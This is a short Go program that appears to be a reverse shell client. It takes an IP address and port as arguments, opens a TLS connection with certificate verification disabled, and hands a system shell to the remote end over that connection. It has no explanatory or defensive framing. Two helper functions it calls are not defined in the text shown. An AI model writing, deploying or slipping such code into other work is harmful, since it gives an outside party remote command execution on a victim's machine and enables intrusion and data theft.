package main

import (
	"fmt"
	"crypto/tls"
	"os"
	"os/exec"
)

func exists(path string) bool {
	_, err := os.Stat(path)
	if err == nil {
		return true
	}
	if os.IsNotExist(err) {
		return false
	}
	return true
}

func main() {
	if len(os.Args) <= 2 {
		fmt.Printf("Usage: %s <ip> <port>", os.Args[0])
		os.Exit(1)
	}
	conf := &tls.Config{
		InsecureSkipVerify: true,
	}
	conn, _ := tls.Dial("tcp", fmt.Sprintf("%s:%s", os.Args[1], os.Args[2]), conf)
	shellPath := GetSystemShell()

	conn.Write([]byte(shellPath + "\n"))

	var cmd *exec.Cmd
	cmd = exec.Command(shellPath)
    RunShell(conn, cmd)
}
